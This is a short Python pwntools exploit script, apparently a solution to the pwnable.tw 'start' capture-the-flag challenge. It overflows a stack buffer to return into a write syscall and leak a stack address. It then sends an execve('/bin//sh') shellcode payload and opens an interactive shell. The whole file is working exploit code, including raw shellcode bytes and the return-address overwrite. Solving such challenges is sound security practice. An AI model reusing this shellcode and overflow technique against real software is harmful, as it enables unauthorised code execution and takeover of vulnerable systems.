from pwn import *
import sys

if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote("chall.pwnable.tw", 10000)
else:
    p = process("./start")
    if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
        gdb.attach(p, """set disassembly-flavor intel
               b _start
               """)

context(arch="i386")
# shellcode = asm(shellcraft.sh())
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"


jmp_inst = asm("jmp [esp-64]")
# print(len(shellcode)) 
# shellcode len is 44 

# hoping aslr is not on!!
write_syscall = 0x08048087

payload = 'A'*20 + p32(write_syscall)

print p.recvuntil("CTF:")
p.send(payload)
leak = p.recv(20)

print "[] leak: ", leak[:4]
leak = u32(leak[:4])
print "[] leak: ", hex(leak)
p.send('A'*20 + p32(leak+0x14) + shellcode)

p.interactive()


